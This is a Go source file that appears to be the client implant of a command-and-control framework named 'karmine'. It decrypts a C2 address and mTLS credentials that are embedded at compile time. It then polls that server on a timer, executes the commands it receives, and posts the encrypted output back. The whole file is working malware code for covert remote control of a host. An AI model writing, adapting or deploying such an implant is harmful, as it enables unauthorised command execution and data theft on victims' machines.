package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"sync"
	"time"

	"github.com/pygrum/karmine/client"
	"github.com/pygrum/karmine/karma/cmd/exec"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/krypto/kryptor"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
)

// set at compile time
var (
	InitC2Endpoint  string
	InitWaitSeconds string
	InitUUID        string
	certData        string
	keyData         string
	InitAESKey      string
	X1              string
	X2              string
	CmdMap          = make(map[int]func(*models.KarResponseObjectCmd, ...models.MultiType) error)
)

func main() {
	// Assign known commands to command function map
	CmdMap[1] = exec.Do
	var wg sync.WaitGroup
	c2Endpoint := InitC2Endpoint
	waitSecondsInt, err := strconv.Atoi(InitWaitSeconds)
	if err != nil {
		waitSecondsInt = 600 // default loop time until next command is 10 minutes
	}

	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	UUID, err := kryptor.Decrypt(InitUUID, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	mTLSClient, err := client.MTLsClientByKryptor(certData, keyData, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	wg.Add(1)
	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands
	wg.Wait()
}

func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
	var prevCmd int
	for range ticker.C {
		cmdObject, cmdID, broadcast, err := requestCmd(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient)
		if err == nil {
			prevCmd = cmdID
			go parseCmdObject(cmdObject, cmdID, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, mTLSClient)
		}
	}
}

func requestCmd(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client) (*models.KarObjectCmd, int, bool, error) {
	// decrypting endpoint and uuid strings. No error handling, they were set at compile time
	genericObj, err := requestData(Endpoint, UUID, "1", mTLSClient)
	if err != nil {
		return nil, 0, false, err
	}
	cmdObj := &models.KarObjectCmd{}
	if len(genericObj.UUID) != 0 {
		genericObj.Object, err = kes.DecryptObject(genericObj.Object, aesKey, kX1, kX2)
		if err != nil {
			return nil, 0, false, err
		}
	}
	if err := json.Unmarshal(genericObj.Object, cmdObj); err != nil {
		return nil, 0, false, err
	}
	if genericObj.CmdID == prevCmd {
		return nil, 0, false, fmt.Errorf("")
	}
	return cmdObj, genericObj.CmdID, genericObj.UUID == "", nil
}

func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*models.GenericData, error) {
	req, err := http.NewRequest(http.MethodGet, Endpoint, nil)
	if err != nil {
		return nil, err
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	value := url.Values{
		"t": {dataType},
	}
	req.URL.RawQuery = value.Encode()
	res, err := mTLSClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	if res.Body == http.NoBody {
		return nil, fmt.Errorf("")
	}
	genericObj := &models.GenericData{}
	body, _ := ioutil.ReadAll(res.Body)
	if err = json.Unmarshal(body, genericObj); err != nil {
		return nil, err
	}
	if genericObj.UUID != UUID {
		// blank if for everyone
		if len(genericObj.UUID) != 0 {
			return nil, fmt.Errorf("")
		}
	}
	return genericObj, nil
}

func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey string, mTLSClient *http.Client) {
	responseObject := &models.KarResponseObjectCmd{}
	cmdlet, args := cmdObject.Cmd, cmdObject.Args
	f, ok := CmdMap[cmdlet]
	var err error
	if !ok {
		responseObject.Code = 1
	} else {
		err = f(responseObject, args...)
		if err != nil {
			responseObject.Code = 1
		}
	}
	respObjectBytes, err := json.Marshal(responseObject)
	if err == nil {
		var uid string
		if !broadcast {
			uid = UUID
			respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
			if err != nil {
				log.Error("")
				return
			}
		}
		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
			UUID:   uid,
			Type:   1, // data type 1 is a command
			CmdID:  cmdID,
			Object: respObjectBytes,
		})
	} else {
		log.Error(err)
	}
}

// generic enough to be called anytime
func postData(Endpoint, UUID string, mTLSClient *http.Client, data *models.GenericData) {
	o, err := json.Marshal(data)
	if err != nil {
		log.Error(err)
		return
	}
	req, err := http.NewRequest(http.MethodPost, Endpoint, bytes.NewReader(o))
	if err != nil {
		log.Error(err)
		return
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	_, err = mTLSClient.Do(req) // no need to save response
	if err != nil {
		log.Error(err)
		return
	}
}
